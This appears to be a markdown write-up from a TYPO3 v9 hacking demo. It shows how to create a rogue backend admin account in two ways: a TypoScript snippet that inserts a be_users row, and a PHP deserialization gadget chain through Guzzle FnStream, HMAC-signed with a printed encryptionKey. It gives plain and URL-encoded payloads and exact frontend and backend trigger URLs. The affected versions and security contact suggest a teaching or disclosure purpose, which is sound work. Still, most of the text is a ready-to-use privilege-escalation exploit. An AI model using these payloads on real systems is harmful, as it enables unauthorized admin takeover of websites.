# Create Admin Account

This scenario describes how non-admin users can "upgrade" their privileged to have admin access.

* use hashed password using MD5 (algorithm does not matter, MD5 is just plain simple)
* `openssl passwd -1 -salt 123456 password`
* `password` -> `$1$123456$qqQvjw0PqIk7otmzNsUIN0`

## Technique TypoScript

```
something.stdWrap {
    cObject = TEXT
    cObject {
        value = be_users
        preUserFunc = TYPO3\CMS\Extbase\Persistence\Generic\Storage\Typo3DbBackend->addRow
        preUserFunc {
            username = h4ck3r31,
            password = $1$123456$qqQvjw0PqIk7otmzNsUIN0
            admin = 1
        }
    }
}
```

### Security Vulnerability

* valid backend sessions required
* TypoScript cannot be defined by non-admin users per default
* extensions allowing to define TypoScript as content element open this **vulnerability**

## Technique Insecure Deserialization, by-passing HMAC verification

By knowing sensitive `encryptionKey` (which is
`f30230987c323b8f81a0ab9fe5b690fd0ba3fb8161f4027221a6b6aa4c50ce629049b7d30c3681f3a9e2031f1dc401e6` for this demo project)
it is possible to invoke signed, but insecure deserialization.

**Steps**

* prepare insecure `PAYLOAD`
  + using `\GuzzleHttp\Psr7\FnStream` as callback
  + using `\TYPO3\CMS\IndexedSearch\Controller\SearchController` as trigger
* prepare malicious TypoScript creating a backend account
* serialize and sign payload with HMAC (based on `encryptionKey`)

**Plain**

```
O:24:"GuzzleHttp\Psr7\FnStream":1:{s:9:"_fn_close";a:2:{i:0;O:51:
"TYPO3\CMS\IndexedSearch\Controller\SearchController":2:{s:20:
"*typoScriptService";O:43:"TYPO3\CMS\Core\TypoScript\TypoScriptService"
:0:{}s:11:"*settings";a:1:{s:7:"results";a:1:{s:20:"summaryCropSignifier"
;a:1:{s:7:"cObject";a:3:{s:20:"_typoScriptNodeValue";s:4:"TEXT";s:5:
"value";s:8:"be_users";s:11:"preUserFunc";a:4:{s:20:"_typoScriptNodeValue"
;s:68:"TYPO3\CMS\Extbase\Persistence\Generic\Storage\Typo3DbBackend->addRow"
;s:8:"username";s:8:"h4ck3r31";s:8:"password";s:32:"$1$123456$qqQvjw0PqIk7otmzNsUIN0"
;s:5:"admin";i:1;}}}}}}i:1;s:10:"initialize";}}82b123396f51a2a274532ced52a6ed4a197ae278
```

**URL encoded** (ready for take-off)

```
O%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A51%3A
%22TYPO3%5CCMS%5CIndexedSearch%5CController%5CSearchController%22%3A2%3A%7Bs%3A20%3A
%22%00%2A%00typoScriptService%22%3BO%3A43%3A%22TYPO3%5CCMS%5CCore%5CTypoScript%5CTypoScriptService%22
%3A0%3A%7B%7Ds%3A11%3A%22%00%2A%00settings%22%3Ba%3A1%3A%7Bs%3A7%3A%22results%22%3Ba%3A1%3A%7Bs%3A20%3A%22summaryCropSignifier%22
%3Ba%3A1%3A%7Bs%3A7%3A%22cObject%22%3Ba%3A3%3A%7Bs%3A20%3A%22_typoScriptNodeValue%22%3Bs%3A4%3A%22TEXT%22%3Bs%3A5%3A
%22value%22%3Bs%3A8%3A%22be_users%22%3Bs%3A11%3A%22preUserFunc%22%3Ba%3A4%3A%7Bs%3A20%3A%22_typoScriptNodeValue%22
%3Bs%3A68%3A%22TYPO3%5CCMS%5CExtbase%5CPersistence%5CGeneric%5CStorage%5CTypo3DbBackend-%3EaddRow%22
%3Bs%3A8%3A%22username%22%3Bs%3A8%3A%22h4ck3r31%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%22%241%24123456%24qqQvjw0PqIk7otmzNsUIN0%22
%3Bs%3A5%3A%22admin%22%3Bi%3A1%3B%7D%7D%7D%7D%7D%7Di%3A1%3Bs%3A10%3A%22initialize%22%3B%7D%7D82b123396f51a2a274532ced52a6ed4a197ae278
```

### Attack

Using some Extbase extension to trigger our payload.

**Frontend**

`ext:form` only works when having a valid backend session, plugins having an uncached default action work perfectly.
Using `&no_cache=1` might not work in all scenarios (but, it does here in this demo project).

```
http://typo3v9-hack.ddev.local/index.php?id=38&no_cache=1&tx_form_formframework[__trustedProperties]=PAYLOAD
```

**Backend**

No caching applied, but `&token=` has to be replaced with current XSRF token.

```
http://typo3v9-hack.ddev.local/typo3/index.php?route=%2Ffile%2FFilelistList%2F
&token=6d3ddff46fd38496f39fd6bd166540385c74c4ee&tx_filelist_file_filelistlist[__trustedProperties]=PAYLOAD
```

### Security Vulnerability

* `guzzlehttp/psr7`, explicitly raised in https://review.typo3.org/#/c/59516/
  + composer scenarios affected until approx. December 2018
  + TYPO3 bundle (zip/tarball) scenarios affected until v8.7.22 and v9.5.3
* exposed `encryptionKey` is (currently) not know as vulnerability
  + if it was, report to security@typo3.org immediately
  + security severity would be **critical**
